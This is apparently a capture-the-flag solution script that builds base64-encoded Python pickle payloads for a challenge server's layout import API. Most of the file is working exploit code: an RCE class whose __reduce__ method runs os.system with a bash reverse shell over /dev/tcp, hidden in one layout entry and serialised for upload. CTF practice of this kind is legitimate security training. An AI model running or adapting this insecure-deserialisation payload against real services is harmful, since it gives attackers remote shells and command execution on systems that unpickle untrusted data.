import pickle
import requests
import base64
import os


def normal_usage(debug=True):
    '''
    this gets accepted by the import api
    '''
    print('normal layout:\n')
    url = 'http://ctf.adl.tw:12004/api/import'
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}
        
    ]
    print("typeof mylayout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return
    myobj={'layout':my_layout}

    r = requests.post(url, json = myobj)
    
    return


class RCE:
    def __reduce__(self):
        dest_ip='127.0.0.1'
        dest_port='8080'
        cmd='bash -c \"bash &>/dev/tcp/%s/%s <&1\"'%(dest_ip,dest_port)
        
        return os.system, (cmd,)
        

def payload():
    
    print('payload layout:\n')
    
    _rce=RCE()
    my_layout=[
    {'id': 'eye01', 'left': 442, 'top': 275},
    {'id': 'eye02', 'left': 4, 'top': 195},
    {'id': 'eye03', 'left': 8, 'top': 487},
    {'id': 'eye04', 'left': 19, 'top': 764},
    {'id': 'eye05', 'left': 826, 'top': 18},
    {'id': 'eye06', 'left': 853, 'top': 313},
    {'id': 'eye07', 'left': 857, 'top': 524},
    {'id': 'eye08', 'left': 889, 'top': 787},
    {'id': 'lip01', 'left': 536, 'top': 450},
    {'id': 'lip02', 'left': 112, 'top': 361},
    {'id': 'lip03', 'left': 99, 'top': 660},
    {'id': 'lip04', 'left': 113, 'top': 840},
    {'id': 'lip05', 'left': 915, 'top': 212},
    {'id': 'lip06', 'left': 861, 'top': 436},
    {'id': 'lip07', 'left': 876, 'top': 687},
    {'id': 'hair01', 'left': 1122, 'top': 22},
    {'id': 'hair02', 'left': 1270, 'top': 30},
    {'id': 'hair03', 'left': 1162, 'top': 148},
    {'id': 'hair04', 'left': 1128, 'top': 296},
    {'id': 'hako01', 'left': 1131, 'top': _rce},
]

    print("typeof my_layout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)




   


#normal_usage()
payload()

